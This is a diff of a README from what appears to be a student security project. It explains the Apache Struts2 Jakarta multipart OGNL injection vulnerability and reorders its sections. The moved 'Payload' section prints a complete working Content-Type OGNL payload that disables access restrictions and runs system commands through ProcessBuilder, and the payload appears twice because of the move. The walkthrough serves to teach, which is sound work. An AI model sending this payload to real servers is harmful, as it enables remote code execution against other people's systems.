@@ -10,7 +10,28 @@ To simply run the webapp:
 If you want to modify this source, the project uses the Maven build system:
 * When modifying source: mvn package (create .jar)
 
-## The Breakdown (as viewed from my IDE)
+### The Payload
+The clever aspect of this vulernability is the exploitation of OGNL (Object Graph Navigation Library).
+
+OGNL uses expressions to perform tasks, and two of the expressions that are allowed is the ability to invoke arbitrary classes in the framework, and chain events. 
+
+So for example, it is possible then to instantiate edu.uvu.ms.cybersecurity.Command object with OGNL 
+ 
+    '(#p=new edu.uvu.ms.cybersecurity.Command(#cmd))).'
+     
+ Or, in a more practical sense, one can invoke the java.lang.ProcessBuilder class to run system level commands 
+  
+    (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())
+
+The following payload contains a command to invoke edu.uvu.ms.cybersecurity.Command and print the command issued to the server into the console, and then proceed to execute the command. (to illustrate chaining of events, and invoking classes)
+
+
+    Content-Type :  %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#p=new edu.uvu.ms.cybersecurity.Command(#cmd)).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+
+
+A portion of this payload was pulled from [Rapid7 GitHub](https://github.com/rapid7/metasploit-framework/issues/8064)
+
+### The Breakdown (as viewed from my IDE)
 
 The Jakarta MultiPart Parser:
    
@@ -20,7 +41,7 @@ The following is a step-by-step look at how this vulnerability is exploited.
 
 The Struts2 Dispatcher: org.apache.struts2.dispatcher.Dispatcher
 
-The Struts Dispatcher.class receives the request, and determines that it should be handled by the JakartaMultiPartRequest.class parser method
+The Struts Dispatcher.class receives the request, and determines that it should be handled by the JakartaMultiPartRequest.class parser method (matches on multipart/form-data in String)
 ![Dispatcher](src/main/resources/META-INF/resources/images/Dispatcher-wrapRequest.png)
 
 The OGLN expression from the Content-Header is then passed into the 'parse' method.
@@ -47,24 +68,4 @@ The result being that any OGLN expressions are now executed
 
 ![Dispatcher](src/main/resources/META-INF/resources/images/OglnTextParser-evaluate.png)
 
-### The Payload
-The clever aspect of this vulernability is the exploitation of OGNL (Object Graph Navigation Library).
-
-OGNL uses expressions to perform tasks, and two of the expressions that are allowed is the ability to invoke arbitrary classes in the framework, and chain events. 
-
-So for example, it is possible then to instantiate edu.uvu.ms.cybersecurity.Command object with OGNL 
- 
-    '(#p=new edu.uvu.ms.cybersecurity.Command(#cmd))).'
-     
- Or, in a more practical sense, one can invoke the java.lang.ProcessBuilder class to run system level commands 
-  
-    (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())
-
-The following payload contains a command to invoke edu.uvu.ms.cybersecurity.Command and print the command issued to the server into the console, and then proceed to execute the command. (to illustrate chaining of events, and invoking classes)
-
-
-    Content-Type :  %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#p=new edu.uvu.ms.cybersecurity.Command(#cmd)).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
-
-
-A portion of this payload was pulled from [Rapid7 GitHub](https://github.com/rapid7/metasploit-framework/issues/8064)
                       
